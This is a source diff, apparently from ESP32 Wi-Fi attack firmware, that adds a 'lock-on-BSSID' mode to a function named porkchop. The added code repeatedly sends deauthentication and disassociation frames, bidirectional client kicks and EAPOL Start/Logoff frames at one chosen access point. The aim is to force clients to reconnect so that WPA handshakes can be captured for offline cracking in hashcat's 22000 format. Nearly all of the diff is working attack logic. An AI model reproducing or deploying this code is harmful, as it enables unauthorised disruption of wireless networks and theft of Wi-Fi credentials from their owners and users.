@@ -225,6 +225,56 @@ void porkchop(const Ctx& ctx) {
         ? (uint32_t)ctx.cooldownSec * 1000u
         : COOLDOWN_MS;
 
+    // Lock-on-BSSID focus: when the sniffer is parked on a target BSSID's
+    // channel waiting for M2/M3/M4 of a 4-way handshake, we MUST keep
+    // kicking that BSSID and only that BSSID. Without this override, a
+    // higher-scoring neighbor on the same channel would steal our kicks
+    // and M2 would never land. We still respect HS DEPTH and RSSI: if the
+    // target already meets depth, or is below minRssi / off-channel /
+    // own-AP, the lock is essentially "lost" and we fall through to the
+    // normal scoring path so the radio can find something useful to do.
+    if (ctx.lockedBssidActive && ctx.lockedBssid[0] != 0) {
+        for (uint8_t i = 0; i < n; i++) {
+            const BeaconSlot& b = ctx.beacons[i];
+            if (memcmp(b.bssid, ctx.lockedBssid, 6) != 0) continue;
+            if (b.channel != ctx.channel) continue;
+            if (ctx.isOwnAp(b.bssid)) break;
+            if (b.rssi < ctx.minRssi) break;
+            // If handshake already complete at this depth, the sniffer
+            // is about to release the lock anyway - don't burn a burst
+            // on it. Fall through to the normal scoring path below.
+            if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) break;
+            // Keep the score EMA warm so when the lock releases the
+            // score for this BSSID isn't a stale 0.
+            ScoreEntry* se = findOrCreateScore(b.bssid);
+            se->lastSeenMs = now;
+            se->score = (se->score * 3 + computeScore(b, ctx.hsDepth)) / 4;
+            se->lastKickMs = now; // suppress cooldown for this BSSID
+            const BeaconSlot& target = b;
+            uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;
+            if (target.clientN && ctx.bidirKick) {
+                for (uint8_t c = 0; c < target.clientN; c++) {
+                    WSLBypasser::sendBidirectionalKick(target.bssid, target.clients[c],
+                                                       ctx.deauthReason, rounds);
+                    *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 4);
+                    if (ctx.eapolTx) {
+                        WSLBypasser::sendEAPOLStart(target.bssid, target.clients[c]);
+                        WSLBypasser::sendEAPOLLogoff(target.bssid, target.clients[c]);
+                    }
+                    yield();
+                }
+            } else {
+                for (uint8_t r = 0; r < rounds; r++) {
+                    ctx.sendRawMgmt(0xC0, target.bssid, ctx.bcast);
+                    if (ctx.jitterMs) delay(1 + (esp_random() % ctx.jitterMs));
+                    ctx.sendRawMgmt(0xA0, target.bssid, ctx.bcast);
+                }
+                *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 2);
+            }
+            return; // exit before the normal scoring loop
+        }
+    }
+
     // Compute / refresh scores; pick the best target this tick.
     int32_t bestScore = INT32_MIN;
     int8_t  bestIdx = -1;
